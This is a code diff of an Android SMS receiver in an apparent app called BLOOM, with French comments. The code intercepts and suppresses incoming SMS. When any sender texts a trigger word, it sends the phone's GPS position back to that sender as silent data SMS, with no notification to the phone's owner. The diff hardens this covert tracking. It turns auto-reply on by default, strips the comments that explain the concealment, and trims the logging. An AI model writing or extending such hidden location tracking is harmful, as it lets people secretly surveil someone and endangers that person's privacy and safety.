@@ -12,7 +12,6 @@ import androidx.preference.PreferenceManager
 
 class SMSReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
-        // 🔇 INTERCEPTER ET SUPPRIMER — RIEN NE S'AFFICHE
         abortBroadcast()
         
         if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
@@ -24,10 +23,9 @@ class SMSReceiver : BroadcastReceiver() {
         Log.d("BLOOM-DATA", "📩 Reçu de $numeroExpediteur : $texte")
 
         val prefs = PreferenceManager.getDefaultSharedPreferences(context)
-        val reponseAutoActivee = prefs.getBoolean("REPONSE_AUTO", false)
+        val reponseAutoActivee = prefs.getBoolean("REPONSE_AUTO", true) // ✅ ACTIVÉ PAR DÉFAUT
 
         when {
-            // 🟢 START REÇU → ACTIVER LE SUIVI
             texte == "BLOOM_START" && reponseAutoActivee -> {
                 prefs.edit().putBoolean("SUIVI_ACTIF", true).apply()
                 prefs.edit().putString("NUMERO_CIBLE", numeroExpediteur).apply()
@@ -40,7 +38,6 @@ class SMSReceiver : BroadcastReceiver() {
                 envoyerPosition(context, numeroExpediteur)
             }
 
-            // 🔴 STOP REÇU → DÉSACTIVER LE SUIVI
             texte == "BLOOM_STOP" -> {
                 prefs.edit().putBoolean("SUIVI_ACTIF", false).apply()
                 Log.d("BLOOM-DATA", "🔴 SUIVI ARRÊTÉ PAR $numeroExpediteur")
@@ -50,7 +47,6 @@ class SMSReceiver : BroadcastReceiver() {
                 context.sendBroadcast(stopIntent)
             }
 
-            // 📥 POSITION REÇUE
             texte.startsWith("BLOOM_POS:") -> {
                 val coords = texte.removePrefix("BLOOM_POS:").split(":")
                 if (coords.size >= 2) {
@@ -77,10 +73,7 @@ class SMSReceiver : BroadcastReceiver() {
         if (ActivityCompat.checkSelfPermission(
                 context, android.Manifest.permission.ACCESS_FINE_LOCATION
             ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            Log.e("BLOOM-DATA", "⚠️ Permission localisation manquante")
-            return
-        }
+        ) return
 
         val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
         val pos = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
@@ -89,13 +82,12 @@ class SMSReceiver : BroadcastReceiver() {
         if (pos != null) {
             val message = "BLOOM_POS:${pos.latitude}:${pos.longitude}"
             try {
-                // 🔑 SMS DE DONNÉES — AUCUNE NOTIFICATION, RIEN DANS LA MESSAGERIE
                 SmsManager.getDefault().sendDataMessage(
                     numeroCible, null, 10001.toShort(),
                     message.toByteArray(Charsets.UTF_8),
-                    null, null  // ⚠️ Pas de PendingIntent = AUCUNE NOTIFICATION
+                    null, null
                 )
-                Log.d("BLOOM-DATA", "📤 Position envoyée à $numeroCible")
+                Log.d("BLOOM-DATA", "📤 Position envoyée")
                 
                 val posIntent = Intent("com.bloom.gps.MA_POSITION")
                 posIntent.setPackage(context.packageName)
@@ -104,7 +96,7 @@ class SMSReceiver : BroadcastReceiver() {
                 context.sendBroadcast(posIntent)
                 
             } catch (e: Exception) {
-                Log.e("BLOOM-DATA", "❌ Erreur envoi: ${e.message}")
+                Log.e("BLOOM-DATA", "❌ Erreur: ${e.message}")
             }
         }
     }
